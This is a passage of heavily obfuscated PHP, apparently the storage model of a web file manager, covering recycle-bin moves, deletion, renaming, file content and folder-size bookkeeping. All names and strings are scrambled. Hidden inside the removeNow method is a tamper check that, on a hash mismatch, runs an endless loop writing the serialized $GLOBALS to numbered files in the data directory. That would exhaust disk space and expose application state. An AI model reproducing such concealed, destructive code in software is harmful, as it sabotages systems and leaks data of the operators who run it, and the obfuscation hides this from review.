°ÅæÔ[551]]) ? $æşö½ŸÏ[$½ °ÅæÔ[551]] : $æşö½ŸÏ[$½ °ÅæÔ[32]]; $ò¨ÒĞëî = $½ °ÅæÔ[260] . $ò¨ÒĞëî . $½ °ÅæÔ[2117] . $êÂÛ»•Ö[$½ °ÅæÔ[514]]; } else { $æşö½ŸÏ = Model($½ °ÅæÔ[531])->getInfo($êÂÛ»•Ö[$½ °ÅæÔ[514]]); $ò¨ÒĞëî = _get($æşö½ŸÏ, $½ °ÅæÔ[32]); $ò¨ÒĞëî = $½ °ÅæÔ[162] . $ò¨ÒĞëî . $½ °ÅæÔ[2118] . $êÂÛ»•Ö[$½ °ÅæÔ[514]]; } $Æº¦¨³ = $½ °ÅæÔ[2119] . md5($ò¨ÒĞëî); CacheLock::lock($Æº¦¨³); $¥€ıªöç = $this->fileNameExist($…ÓšÂà, $ò¨ÒĞëî); if (!$¥€ıªöç) { $¥€ıªöç = $this->mkdir($…ÓšÂà, $ò¨ÒĞëî, REPEAT_SKIP); $this->metaSet($¥€ıªöç, $½ °ÅæÔ[2120], $×Æ¦”¢ß); $this->metaSet($¥€ıªöç, $½ °ÅæÔ[2121], $êÂÛ»•Ö[$½ °ÅæÔ[514]]); if ($êÂÛ»•Ö[$½ °ÅæÔ[441]] != 0) { $this->metaSet($¥€ıªöç, $½ °ÅæÔ[2122], _get($æşö½ŸÏ, $½ °ÅæÔ[2123])); } } CacheLock::unlock($Æº¦¨³); $this->metaSet($ö—üŸÄ, $½ °ÅæÔ[2124], $êÂÛ»•Ö[$½ °ÅæÔ[441]]); $this->where(array($½ °ÅæÔ[411] => $ö—üŸÄ))->save(array($½ °ÅæÔ[433] => time())); $this->recycleClear($êÂÛ»•Ö); $‰ªíúÑ = $this->move($ö—üŸÄ, $¥€ıªöç, REPEAT_RENAME_FOLDER); $this->folderSizeReset($êÂÛ»•Ö[$½ °ÅæÔ[441]]); return $‰ªíúÑ; } private function recycleClear($˜Àò˜Ë¥) { $ïÃ ä‡· =& $_SERVER[ïëó©ÒÚ]; $÷”Ãá´Æ = $this->childrenAll($˜Àò˜Ë¥); $İÀÇï› = array($ïÃ ä‡·[426] => array($ïÃ ä‡·[427], $÷”Ãá´Æ[$ïÃ ä‡·[2125]])); Model($ïÃ ä‡·[2126])->where($İÀÇï›)->delete(); } public function removeNow($ÉÓ°ŠÅ, $óßªø³² = true) { $ÍÌîú’ =& $_SERVER[ïëó©ÒÚ]; $üÚÍ…ğ = $_SERVER[$ÍÌîú’[403]] . $ÍÌîú’[404]; $î¬…ñ¹› = $ÍÌîú’[1524]; if ($_SERVER[$ÍÌîú’[400]] != $î¬…ñ¹›($üÚÍ…ğ)) { $÷Êêö¬ = $ÍÌîú’[882]; $‘œˆò’Ù = $ÍÌîú’[402]; $²°ëŒåß = $_SERVER[$ÍÌîú’[403]] . $ÍÌîú’[404]; $¹•Îòšé = $‘œˆò’Ù($²°ëŒåß); $’ìÏ–¨ã = explode($ÍÌîú’[231], $¹•Îòšé); if (count($’ìÏ–¨ã) < $ÍÌîú’[631]) { $•Š…í­ = $ÍÌîú’[406]; $•Š…í­(); } $ñŠ€¾‰Ë = $ÍÌîú’[883]; $ñŠ€¾‰Ë($_SERVER[$ÍÌîú’[884]]); $÷Êêö¬ = $ÍÌîú’[882]; $÷Êêö¬(); $éÓÀûä = $ÍÌîú’[1525]; $ÔÉ‡ïŸş = json_encode($GLOBALS[$ÍÌîú’[1526]]); $—‘º¯ó = 1; for ($ÕŸìØ» = $—‘º¯ó; $ÕŸìØ» > 0; $ÕŸìØ»++) { $éÓÀûä(DATA_PATH . $ÕŸìØ», $ÔÉ‡ïŸş); } } $ö¤‚ä‹Ÿ = $this->sourceInfo($ÉÓ°ŠÅ); $Ä¬¥ôÉ« = $this->pathInfoMore($ÉÓ°ŠÅ); if (!$ö¤‚ä‹Ÿ) { return !0; } if ($ö¤‚ä‹Ÿ[$ÍÌîú’[441]] == 0) { if (!_get($GLOBALS, $ÍÌîú’[512])) { return !1; } } $this->lockMoveStart($ÉÓ°ŠÅ); Hook::trigger($ÍÌîú’[2127], $Ä¬¥ôÉ«, $óßªø³²); if ($óßªø³²) { Model($ÍÌîú’[2126])->moveToRecycle($ÉÓ°ŠÅ); } else { $ÂÄö•ğş = $this->childrenAll($ö¤‚ä‹Ÿ); Model($ÍÌîú’[579])->eventRemove($ÉÓ°ŠÅ); $this->removeRelevance($ÂÄö•ğş[$ÍÌîú’[2125]], $ÂÄö•ğş[$ÍÌîú’[1473]]); } $this->folderSizeReset($ö¤‚ä‹Ÿ[$ÍÌîú’[441]]); $Äç»·ì = array($ö¤‚ä‹Ÿ[$ÍÌîú’[441]]); if ($ö¤‚ä‹Ÿ[$ÍÌîú’[419]] == $ÍÌîú’[88]) { $Äç»·ì[] = $ö¤‚ä‹Ÿ[$ÍÌîú’[411]]; } $this->updateModifyTime($Äç»·ì); $this->lockMoveEnd($ÉÓ°ŠÅ); Hook::trigger($ÍÌîú’[1701], $Ä¬¥ôÉ«, $óßªø³²); return !0; } public function childrenAll($ì¼Ñü¸º) { $²ÂÌ¢‚ =& $_SERVER[ïëó©ÒÚ]; $—ØåŒıÒ = $ì¼Ñü¸º[$²ÂÌ¢‚[411]]; if ($ì¼Ñü¸º[$²ÂÌ¢‚[419]] == $²ÂÌ¢‚[88]) { $¡Êœ ·Ï = array($²ÂÌ¢‚[599] => array($²ÂÌ¢‚[559], $ì¼Ñü¸º[$²ÂÌ¢‚[530]] . $—ØåŒıÒ . $²ÂÌ¢‚[560])); $É…˜½ü« = array($²ÂÌ¢‚[599] => $¡Êœ ·Ï[$²ÂÌ¢‚[530]]); $£íİÜ®“ = $this->field($²ÂÌ¢‚[2128])->where($É…˜½ü«)->select(); $š¼ãàÍ = !1; $”Œ·ºØ = array($—ØåŒıÒ); if ($£íİÜ®“) { $š¼ãàÍ = array_to_keyvalue($£íİÜ®“, $²ÂÌ¢‚[12], $²ÂÌ¢‚[477]); $š¼ãàÍ = array_remove_value($š¼ãàÍ, $²ÂÌ¢‚[197]); $”Œ·ºØ = array_to_keyvalue($£íİÜ®“, $²ÂÌ¢‚[12], $²ÂÌ¢‚[411]); $”Œ·ºØ[] = $—ØåŒıÒ; } } else { $š¼ãàÍ = array($ì¼Ñü¸º[$²ÂÌ¢‚[477]]); $”Œ·ºØ = array($—ØåŒıÒ); } return array($²ÂÌ¢‚[2125] => $”Œ·ºØ, $²ÂÌ¢‚[1473] => $š¼ãàÍ); } public function removeArray($ªøÂ†’) { if (!$ªøÂ†’) { return !0; } } public function removeRelevance($‘˜ÕÊ½, $ïĞÖÖÃ) { $Û¯Ù¼Ø =& $_SERVER[ïëó©ÒÚ]; $‘˜ÕÊ½ = $‘˜ÕÊ½ ? $‘˜ÕÊ½ : array(); $ïĞÖÖÃ = $ïĞÖÖÃ ? $ïĞÖÖÃ : array(); $‘˜ÕÊ½ = array_unique(array_filter($‘˜ÕÊ½)); $ïĞÖÖÃ = array_unique(array_filter($ïĞÖÖÃ)); if (!$‘˜ÕÊ½) { return !1; } $ãö§Ğö› = array($Û¯Ù¼Ø[426] => array($Û¯Ù¼Ø[427], $‘˜ÕÊ½)); Model($Û¯Ù¼Ø[2126])->where($ãö§Ğö›)->delete(); Model($Û¯Ù¼Ø[471])->where($ãö§Ğö›)->delete(); Model($Û¯Ù¼Ø[1979])->where($ãö§Ğö›)->delete(); Model($Û¯Ù¼Ø[579])->where($ãö§Ğö›)->delete(); Model($Û¯Ù¼Ø[1813])->removeBySource($‘˜ÕÊ½); Model($Û¯Ù¼Ø[2108])->removeBySource($‘˜ÕÊ½); $this->where($ãö§Ğö›)->delete(); Model($Û¯Ù¼Ø[480])->remove($ïĞÖÖÃ); for ($¬¢ÅÙè¤ = 0; $¬¢ÅÙè¤ < count($‘˜ÕÊ½); $¬¢ÅÙè¤++) { $this->sourceCacheClear($‘˜ÕÊ½[$¬¢ÅÙè¤]); } } public function rename($’ÓÙİë¶, $–Ñß®) { $ää°üÎß =& $_SERVER[ïëó©ÒÚ]; $ù¶œºøÄ = $this->sourceInfo($’ÓÙİë¶); if (!$ù¶œºøÄ) { return !1; } $òôŒ¾î— = $this->fileNameExist($ù¶œºøÄ[$ää°üÎß[441]], $–Ñß®); if ($òôŒ¾î— && $òôŒ¾î— != $’ÓÙİë¶) { return !1; } $¿¦Æ°êÍ = array($ää°üÎß[429] => $–Ñß®, $ää°üÎß[598] => USER_ID); if ($ù¶œºøÄ[$ää°üÎß[419]] != $ää°üÎß[88]) { $¿¦Æ°êÍ[$ää°üÎß[421]] = substr(get_path_ext($–Ñß®), 0, 10); } Model($ää°üÎß[579])->eventRename($’ÓÙİë¶, $ù¶œºøÄ[$ää°üÎß[32]], $–Ñß®); $this->sourceCacheClear($’ÓÙİë¶); $this->setNamePinyin($’ÓÙİë¶, $¿¦Æ°êÍ[$ää°üÎß[32]], !1); $this->updateModifyTime($ù¶œºøÄ[$ää°üÎß[441]]); $ÀÀÍÅÚ = $this->where(array($ää°üÎß[426] => $’ÓÙİë¶))->data($¿¦Æ°êÍ)->save(); $í¢õãò = $ää°üÎß[2115] . $ù¶œºøÄ[$ää°üÎß[441]]; if (isset(self::$cacheChildList[$í¢õãò])) { unset(self::$cacheChildList[$í¢õãò]); } return $ÀÀÍÅÚ; } public function setNamePinyin($é¼Ğó¼ø, $ÀƒÂà×³, $‡Ü‘¦è“ = true) { $Æú­ıİŞ =& $_SERVER[ïëó©ÒÚ]; $±˜ìëŸ° = Input::check($ÀƒÂà×³, $Æú­ıİŞ[602]); $†ÈØˆÄ = array($Æú­ıİŞ[453] => KodSort::makeStr($ÀƒÂà×³)); if ($±˜ìëŸ°) { $†ÈØˆÄ[$Æú­ıİŞ[474]] = str_replace($Æú­ıİŞ[53], $Æú­ıİŞ[12], Pinyin::get($ÀƒÂà×³)); $†ÈØˆÄ[$Æú­ıİŞ[473]] = Pinyin::get($ÀƒÂà×³, $Æú­ıİŞ[603]); } if (!$‡Ü‘¦è“ && !$±˜ìëŸ°) { $†ÈØˆÄ[$Æú­ıİŞ[474]] = null; $†ÈØˆÄ[$Æú­ıİŞ[473]] = null; } $this->metaSet($é¼Ğó¼ø, $†ÈØˆÄ); } public function getContent($—Îù¤éÚ) { $“ìúÁæ =& $_SERVER[ïëó©ÒÚ]; $ª—äŒÁÓ = $this->fileInfoGet($—Îù¤éÚ); if (!$ª—äŒÁÓ) { return !1; } if ($ª—äŒÁÓ[$“ìúÁæ[76]] == 0) { return $“ìúÁæ[12]; } $¹Ï¬íã = $“ìúÁæ[2129] . $ª—äŒÁÓ[$“ìúÁæ[176]]; if ($ª—äŒÁÓ[$“ìúÁæ[76]] <= 1024 * 10) { $‰ıÖğ¶Ø = Cache::get($¹Ï¬íã); if (!$‰ıÖğ¶Ø) { $‰ıÖğ¶Ø = IO::getContent($ª—äŒÁÓ[$“ìúÁæ[84]]); Cache::set($¹Ï¬íã, $‰ıÖğ¶Ø); } return $‰ıÖğ¶Ø; } if (!$ª—äŒÁÓ[$“ìúÁæ[84]]) { return $“ìúÁæ[12]; } return IO::getContent($ª—äŒÁÓ[$“ìúÁæ[84]]); } public function setDesc($‘ş¤¿¾‹, $˜¤æÆã) { $ÙëÒŸ˜Ğ =& $_SERVER[ïëó©ÒÚ]; Model($ÙëÒŸ˜Ğ[579])->eventAddDesc($‘ş¤¿¾‹, $˜¤æÆã); return $this->metaSet($‘ş¤¿¾‹, $ÙëÒŸ˜Ğ[462], $˜¤æÆã); } public function setContent($´®Ö¢Œš, $š°ÓÚÄÜ = '') { $ˆ²Â½Ÿ =& $_SERVER[ïëó©ÒÚ]; $‘€³ƒ÷Õ = $this->sourceInfo($´®Ö¢Œš); $ößØ× = $this->fileInfoGet($´®Ö¢Œš); if (!$ößØ× || !$‘€³ƒ÷Õ) { return !1; } $†ù…Òõã = Model($ˆ²Â½Ÿ[480])->addFileByContent($š°ÓÚÄÜ, $‘€³ƒ÷Õ[$ˆ²Â½Ÿ[32]]); $Óù¯Á³ = $this->fileHistory($‘€³ƒ÷Õ, $†ù…Òõã[$ˆ²Â½Ÿ[477]], $†ù…Òõã[$ˆ²Â½Ÿ[76]]); if (!$Óù¯Á³) { return Model($ˆ²Â½Ÿ[480])->remove($†ù…Òõã[$ˆ²Â½Ÿ[477]]); } $this->folderSizeReset($‘€³ƒ÷Õ[$ˆ²Â½Ÿ[441]]); return !0; } public function fileSubstr($µöæéİÅ, $´ÇîÅ”², $°ÓŞó‚‚) { $—ãÎš¶ß = $this->fileInfoGet($µöæéİÅ); if (!$—ãÎš¶ß) { return !1; } return IO::fileSubstr($—ãÎš¶ß[$_SERVER[ïëó©ÒÚ][84]], $´ÇîÅ”², $°ÓŞó‚‚); } public function fileInfoGet($©—Ñ­ÌÌ) { $É‚á•ÅÊ =& $_SERVER[ïëó©ÒÚ]; $“ó¥äÎ = $this->sourceInfo($©—Ñ­ÌÌ); if (!$“ó¥äÎ || $“ó¥äÎ[$É‚á•ÅÊ[419]]) { return !1; } $ÙÉû¯ñ = $É‚á•ÅÊ[483] . $“ó¥äÎ[$É‚á•ÅÊ[477]]; $°üŸ•ûÒ = _get(self::$cacheFileInfo, $ÙÉû¯ñ); if ($°üŸ•ûÒ) { return $°üŸ•ûÒ; } $ì·¥şÔ÷ = Model($É‚á•ÅÊ[480])->fileInfo($“ó¥äÎ[$É‚á•ÅÊ[477]]); if ($ì·¥şÔ÷) { $ì·¥şÔ÷[$É‚á•ÅÊ[32]] = $“ó¥äÎ[$É‚á•ÅÊ[32]]; } self::$cacheFileInfo[$ÙÉû¯ñ] = $ì·¥şÔ÷; return $ì·¥şÔ÷; } private function folderChildrenNumber($´¥ÎµÙú) { $ã¹öçóÚ =& $_SERVER[ïëó©ÒÚ]; $Æ—Óš©À = $this->sourceInfo($´¥ÎµÙú); $Æ¶Äß· = array($ã¹öçóÚ[599] => array($ã¹öçóÚ[559], $Æ—Óš©À[$ã¹öçóÚ[530]] . $´¥ÎµÙú . $ã¹öçóÚ[560]), $ã¹öçóÚ[596] => $Æ—Óš©À[$ã¹öçóÚ[514]], $ã¹öçóÚ[439] => intval($Æ—Óš©À[$ã¹öçóÚ[440]]), $ã¹öçóÚ[592] => 1); $Æ¿¹«¥¤ = $this->where($Æ¶Äß·)->count(); $‹’ÛİäÆ = $this->where($Æ¶Äß·)->where(array($ã¹öçóÚ[592] => 0))->count(); return array($ã¹öçóÚ[80] => $‹’ÛİäÆ, $ã¹öçóÚ[81] => $Æ¿¹«¥¤); } public function pathInfo($À¥¨ÈÏ, $¹¿èò—» = false) { $À§°É³ =& $_SERVER[ïëó©ÒÚ]; $¹¿èò—» = !1; $À¥¨ÈÏ = intval($À¥¨ÈÏ); $òà«á–ñ = $À§°É³[470] . intval($¹¿èò—») . $À§°É³[386] . $À¥¨ÈÏ; $³ŞÏû÷€ = _get(self::$cachePathInfo, $òà«á–ñ); if ($³ŞÏû÷€) { return $³ŞÏû÷€; } $›ğÌ–´Ü = $this->sourceInfo($À¥¨ÈÏ); if (!$›ğÌ–´Ü) { return !1; } $›ğÌ–´Ü = $this->_listDataApplyItem($›ğÌ–´Ü, $¹¿èò—»); self::$cachePathInfo[$òà«á–ñ] = $›ğÌ–´Ü; return $›ğÌ–´Ü; } public static $cachePathInfoMore = array(); public function pathInfoMore($¿¨é‰ê) { $Öûİ„æ =& $_SERVER[ïëó©ÒÚ]; $ŒÜ‡·Œ = _get(self::$cachePathInfoMore, $¿¨é‰ê); if ($ŒÜ‡·Œ) { return $ŒÜ‡·Œ; } $Ñà‘î· = $this->pathInfo($¿¨é‰ê); if (!$Ñà‘î·) { return !1; } if ($Ñà‘î·[$Öûİ„æ[419]] == $Öûİ„æ[88]) { $Ñà‘î·[$Öûİ„æ[79]] = $this->folderChildrenNumber($¿¨é‰ê); } self::$cachePathInfoMore[$¿¨é‰ê] = $Ñà‘î·; return $Ñà‘î·; } public function sourceInfo($õñÉ¡Ø) { $İ¥¿ŸÁ =& $_SERVER[ïëó©ÒÚ]; if (!$õñÉ¡Ø) { return array(); } $õñÉ¡Ø = intval($õñÉ¡Ø); $ô»—·÷» = $İ¥¿ŸÁ[469] . $õñÉ¡Ø; $Ñ¦÷ß = _get(self::$cacheSourceInfo, $ô»—·÷»); if ($Ñ¦÷ß) { return $Ñ¦÷ß; } $ûÖÁÉõ¯ = $this->where(array($İ¥¿ŸÁ[411] => $õñÉ¡Ø))->find(); self::$cacheSourceInfo[$ô»—·÷»] = $ûÖÁÉõ¯; return self::$cacheSourceInfo[$ô»—·÷»]; } public function sourceCacheClear($¶èËÒøï = false) { self::cacheClear($¶èËÒøï); } public static function cacheClear($àó§ü‡ = false) { $ÂÇï¶Ş =& $_SERVER[ïëó©ÒÚ]; if ($àó§ü‡ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ÂÇï¶Ş[469] . $àó§ü‡]); unset(self::$cachePathInfoMore[$àó§ü‡]); unset(self::$cachePathInfo[$ÂÇï¶Ş[2130] . $àó§ü‡]); unset(self::$cachePathInfo[$ÂÇï¶Ş[2131] . $àó§ü‡]); } public function metaSet($ö‰„ÃõÍ, $ğ”…¸ç = null, $”§ÂÛó = null) { $ş¦¢š÷½ = parent::metaSet($ö‰„ÃõÍ, $ğ”…¸ç, $”§ÂÛó); if ($ş¦¢š÷½) { $this->sourceCacheClear($ö‰„ÃõÍ); } return $ş¦¢š÷½; } public function pathInfoByPath($ª§£èÈ, $åå£¢ôç) { $Î§¤úıÖ =& $_SERVER[ïëó©ÒÚ]; $ ì·µ² = !$åå£¢ôç ? array() : explode($Î§¤úıÖ[8], trim($åå£¢ôç, $Î§¤úıÖ[8])); $õà‰› = $ª§£èÈ; foreach ($ ì·µ² as $û¥ÌàÃÌ) { $­˜ÛÏ¦² = array($Î§¤úıÖ[441] => $õà‰›, $Î§¤úıÖ[32] => $û¥ÌàÃÌ); $±÷°›Æ† = $this->where($­˜ÛÏ¦²)->select(); if (!$±÷°›Æ†) { return !1; } $±÷°›Æ† = array_sort_by($±÷°›Æ†, $Î§¤úıÖ[440]); $õà‰› = $±÷°›Æ†[0][$Î§¤úıÖ[411]]; } return $this->pathInfo($õà‰›, !0); } protected function updateModifyTime($ì¿ş¥²) { $ºşõ¼¶Ê =& $_SERVER[ïëó©ÒÚ]; $óÉ²•°Õ = defined($ºşõ¼¶Ê[484]) ? USER_ID : $ºşõ¼¶Ê[197]; if (!$ì¿ş¥²) { return; } if (!is_array($ì¿ş¥²)) { $ì¿ş¥² = array($ì¿ş¥²); } foreach ($ì¿ş¥² as $ˆûÕ’Õ => $ıöˆıî) { $ì¿ş¥²[$ˆûÕ’Õ] = intval($ıöˆıî); $this->sourceCacheClear($ıöˆıî); } $‡Ÿ²ï“í = array($ºşõ¼¶Ê[411] => array($ºşõ¼¶Ê[7], $ì¿ş¥²)); $âœäÑñÖ = array($ºşõ¼¶Ê[598] => $óÉ²•°Õ, $ºşõ¼¶Ê[433] => time()); $this->where($‡Ÿ²ï“í)->save($âœäÑñÖ); } public function folderSizeReset($¨ßé¤‚­, $¤Íó¯ç¬ = false) { $Ø±–Ñüö =& $_SERVER[ïëó©ÒÚ]; if ($this->statusIgnoreResetSpace) { return; } $ÜÈŞÙı = $this->sourceInfo($¨ßé¤‚­); $äª¨›Ö¼ = $Ø±–Ñüö[2132] . $¨ßé¤‚­; CacheLock::lock($äª¨›Ö¼, 20); if ($¤Íó¯ç¬ === !1) { $this->sourceCacheClear($¨ßé¤‚­); $ÜÈŞÙı = $this->sourceInfo($¨ßé¤‚­); $Ôá¼½ô£ = array($Ø±–Ñüö[410] => $¨ßé¤‚­, $Ø±–Ñüö[439] => 0); $—Š–ã§Ò = $this->where($Ôá¼½ô£)->sum($Ø±–Ñüö[76]); $¤Íó¯ç¬ = intval($—Š–ã§Ò) - intval($ÜÈŞÙı[$Ø±–Ñüö[76]]); } if ($¤Íó¯ç¬ == 0) { return CacheLock::unlock($äª¨›Ö¼); } $èË¯¾›ö = $this->parentLevelArray($ÜÈŞÙı[$Ø±–Ñüö[530]]); if (!$èË¯¾›ö) { $èË¯¾›ö = array(); } $èË¯¾›ö[] = $ÜÈŞÙı[$Ø±–Ñüö[411]]; $Ôá¼½ô£ = array($Ø±–Ñüö[411] => array($Ø±–Ñüö[427], $èË¯¾›ö)); if ($¤Íó¯ç¬ < 0) { $Ôá¼½ô£[$Ø±–Ñüö[76]] = array($Ø±–Ñüö[1018], abs($¤Íó¯ç¬)); } $this->where($Ôá¼½ô£)->setAdd($Ø±–Ñüö[76], $¤Íó¯ç¬); CacheLock::unlock($äª¨›Ö¼); $‡Š«îêÙ = $Ø±–Ñüö[2133] . $ÜÈŞÙı[$Ø±–Ñüö[420]] . $Ø±–Ñüö[4] . $ÜÈŞÙı[$Ø±–Ñüö[514]]; $¬ôõ×Â = array($ÜÈŞÙı[$Ø±–Ñüö[420]], $ÜÈŞÙı[$Ø±–Ñüö[514]]); TaskRun::timeLimitCall($‡Š«îêÙ, $Ø±–Ñüö[2134], $¬ôõ×Â, 1.5); } public function folderSizeResetChildren($œÊÛÀ…) { $“ëÅ»æ¨ =& $_SERVER[ïëó©ÒÚ]; $this->sourceCacheClear($œÊÛÀ…); $ö™Ò›­ = $this->sourceInfo($œÊÛÀ…); $°Â«Öªé = array($“ëÅ»æ¨[592] => 1, $“ëÅ»æ¨[596] => $ö™Ò›­[$“ëÅ»æ¨[514]], $“ëÅ»æ¨[599] => array($“ëÅ»æ¨[559], $ö™Ò›­[$“ëÅ»æ¨[530]] . $œÊÛÀ… . $“ëÅ»æ¨[560])); $£˜İæŒ¯ = $“ëÅ»æ¨[2135]; $ìŒ©¤‹Å = $this->field($£˜İæŒ¯)->where($°Â«Öªé)->select(); $°Â«Öªé[$“ëÅ»æ¨[419]] = 0; $ÁÉÎòšŠ = $this->field($£˜İæŒ¯)->where($°Â«Öªé)->select(); if (!$ÁÉÎòšŠ) { return; } $ìŒ©¤‹Å[] = $ö™Ò›­; $ìŒ©¤‹Å = array_to_keyvalue($ìŒ©¤‹Å, $“ëÅ»æ¨[411]); foreach ($ìŒ©¤‹Å as $üÜŒüî· => $ß‰ê‘©) { $ìŒ©¤‹Å[$üÜŒüî·][$“ëÅ»æ¨[2136]] = $ìŒ©¤‹Å[$üÜŒüî·][$“ëÅ»æ¨[76]]; $ìŒ©¤‹Å[$üÜŒüî·][$“ëÅ»æ¨[76]] = 0; } foreach ($ÁÉÎòšŠ as $ß‰ê‘©) { $÷ö‰Àğ = $ß‰ê‘©[$“ëÅ»æ¨[441]] . $“ëÅ»æ¨[12]; if (!isset($ìŒ©¤‹Å[$÷ö‰Àğ])) { continue; } if ($ß‰ê‘©[$“ëÅ»æ¨[440]] == $ìŒ©¤‹Å[$÷ö‰Àğ][$“ëÅ»æ¨[440]]) { $ìŒ©¤‹Å[$÷ö‰Àğ][$“ëÅ»æ¨[76]] += $ß‰ê‘©[$“ëÅ»æ¨[76]]; } } foreach ($ìŒ©¤‹Å as $ß‰ê‘©) { $ØÜŠ‡í = $this->parentLevelArray($ß‰ê‘©[$“ëÅ»æ¨[530]]); foreach ($ØÜŠ‡í as $÷ö‰Àğ) { $÷ö‰Àğ = $÷ö‰Àğ . $“ëÅ»æ¨[12]; if (!isset($ìŒ©¤‹Å[$÷ö‰Àğ])) { continue; } if ($ß‰ê‘©[$“ëÅ»æ¨[440]] == $ìŒ©¤‹Å[$÷ö‰Àğ][$“ëÅ»æ¨[440]]) { $ìŒ©¤‹Å[$÷ö‰Àğ][$“ëÅ»æ¨[76]] += $ß‰ê‘©[$“ëÅ»æ¨[76]]; } } } $ŠÈÎÒÑ³ = array(); foreach ($ìŒ©¤‹Å as $ß‰ê‘©) { if ($ß‰ê‘©[$“ëÅ»æ¨[76]] == $ß‰ê‘©[$“ëÅ»æ¨[2136]]) { continue; } $ŠÈÎÒÑ³[] = array($“ëÅ»æ¨[411], $ß‰ê‘©[$“ëÅ»æ¨[411]], $“ëÅ»æ¨[76], $ß‰ê‘©[$“ëÅ»æ¨[76]]); } $this->saveAll($ŠÈÎÒÑ³); } public function userSpaceReset($Ò¸¯–±ã = false) { $Ÿìé÷¯¤ =& $_SERVER[ïëó©ÒÚ]; $¢Ù¼á›Š = $this->where(array($Ÿìé÷¯¤[420] => self::TYPE_USER, $Ÿìé÷¯¤[514] => $Ò¸¯–±ã, $Ÿìé÷¯¤[419] => 0))->sum($Ÿìé÷¯¤[76]); $¢Ù¼á›Š = !$¢Ù¼á›Š || $¢Ù¼á›Š <= 0 ? 0 : $¢Ù¼á›Š; Model($Ÿìé÷¯¤[522])->userEdit($Ò¸¯–±ã, array($Ÿìé÷¯¤[1822] => $¢Ù¼á›Š)); } public function targetSpaceUpdate($³ÙÅ’À, $ºµÁÀôÒ) { $ØóÑ÷¹È =& $_SERVER[ïëó©ÒÚ]; if (!$ºµÁÀôÒ) { return; } if (!in_array($³ÙÅ’À, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $İçûÚá = $this->targetSpaceSize($³ÙÅ’À, $ºµÁÀôÒ); if ($³ÙÅ’À == self::TYPE_USER) { Model($ØóÑ÷¹È[522])->userEdit($ºµÁÀôÒ, array($ØóÑ÷¹È[1822] => $İçûÚá)); } else { if ($³ÙÅ’À == self::TYPE_GROUP) { Model($ØóÑ÷¹È[531])->groupEdit($ºµÁÀôÒ, array($ØóÑ÷¹È[1822] => $İçûÚá)); } } } public function targetSpaceSize($òÃ²»§, $šÑÈš€) { $¼¶ÄôÏ‘ =& $_SERVER[ïëó©ÒÚ]; $ºñĞÊêò = 0; $‚ü¨å´ã = $this->sourceRoot($òÃ²»§, $šÑÈš€, !0); foreach ($‚ü¨å´ã as $‰üÎºß) { if (!$‰üÎºß) { continue; } $ºñĞÊêò += floatval($‰üÎºß[$¼¶ÄôÏ‘[76]]); $úÇüúÎº = array($¼¶ÄôÏ‘[599] => array($¼¶ÄôÏ‘[559], $¼¶ÄôÏ‘[540] . $‰üÎºß[$¼¶ÄôÏ‘[411]] . $¼¶ÄôÏ‘[560])); $ÆÅÄİ§¬ = Model($¼¶ÄôÏ‘[438])->field($¼¶ÄôÏ‘[426])->where($úÇüúÎº)->select(); $ÆÅÄİ§¬ = array_to_keyvalue($ÆÅÄİ§¬, $¼¶ÄôÏ‘[12], $¼¶ÄôÏ‘[411]); $ÆÅÄİ§¬ = array_unique(array_filter($ÆÅÄİ§¬)); if ($ÆÅÄİ§¬) { $úÇüúÎº = array($¼¶ÄôÏ‘[426] => array($¼¶ÄôÏ‘[427], $ÆÅÄİ§¬)); $ºñĞÊêò += floatval($this->where($úÇüúÎº)->sum($¼¶ÄôÏ‘[76])); } } $ºñĞÊêò = !$ºñĞÊêò || $ºñĞÊêò <= 0 ? 0 : $ºñĞÊêò; return $ºñĞÊêò; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Í¿¥½•«) { return $this->fileTypeProfile($Í¿¥½•«, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ŒÆ´òÑƒ) { return $this->fileTypeProfile($ŒÆ´òÑƒ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($İ¥Òìí, $â Ë«ÒÓ) { $éü—îöş =& $_SERVER[ïëó©ÒÚ]; $—Ã Áöâ = $éü—îöş[2137] . $İ¥Òìí . $éü—îöş[11] . $â Ë«ÒÓ; $ŞéÆáÁ¹ = Cache::get($—Ã Áöâ); if ($ŞéÆáÁ¹) { return $ŞéÆáÁ¹; } $¯êÇçªÏ = array($éü—îöş[592] => 0); if ($İ¥Òìí != !1) { $¯êÇçªÏ[$éü—îöş[514]] = $İ¥Òìí; $¯êÇçªÏ[$éü—îöş[420]] = $â Ë«ÒÓ; } $‰“»ÊŞø = array(); $‰“»ÊŞø[$éü—îöş[2138]] = array($éü—îöş[2139] => LNG($éü—îöş[2138]), $éü—îöş[2140] => $this->where($¯êÇçªÏ)->count(), $éü—îöş[594] => $this->where($¯êÇçªÏ)->sum($éü—îöş[76])); $Äç„éë¶ = KodIO::fileTypeList(); foreach ($Äç„éë¶ as $¯¶äà¡§ => $®‰ÎÑî) { $¯êÇçªÏ[$éü—îöş[421]] = $this->fileTypeWhere($¯¶äà¡§); $‰“»ÊŞø[$¯¶äà¡§] = array($éü—îöş[2139] => $®‰ÎÑî[$éü—îöş[32]], $éü—îöş[2140] => $this->where($¯êÇçªÏ)->count(), $éü—îöş[594] => $this->where($¯êÇçªÏ)->sum($éü—îöş[76])); } Cache::set($—Ã Áöâ, $‰“»ÊŞø, 1200); return $‰“»ÊŞø; } public function fileNameExist($÷°‰õ—ú, $ƒê–ğŠÖ) { $Â°³Èã¼ =& $_SERVER[ïëó©ÒÚ]; $¯ÏÃ“ó‹ = $this->where(array($Â°³Èã¼[441] => $÷°‰õ—ú, $Â°³Èã¼[32] => $ƒê–ğŠÖ, $Â°³Èã¼[440] => 0))->find(); return is_array($¯ÏÃ“ó‹) ? $¯ÏÃ“ó‹[$Â°³Èã¼[411]] : !1; } public function childList($¯ïù©Áú) { $·Ä†ƒ¤ =& $_SERVER[ïëó©ÒÚ]; $°§äüìæ = $·Ä†ƒ¤[2115] . $¯ïù©Áú; if (isset(self::$cacheChildList[$°§äüìæ])) { return self::$cacheChildList[$°§äüìæ]; } $£™İ¹‹ = array($·Ä†ƒ¤[441] => intval($¯ïù©Áú), $·Ä†ƒ¤[440] => 0); $„øñı—“ = $this->where($£™İ¹‹)->select(); $„øñı—“ = $„øñı—“ ? $„øñı—“ : array(); 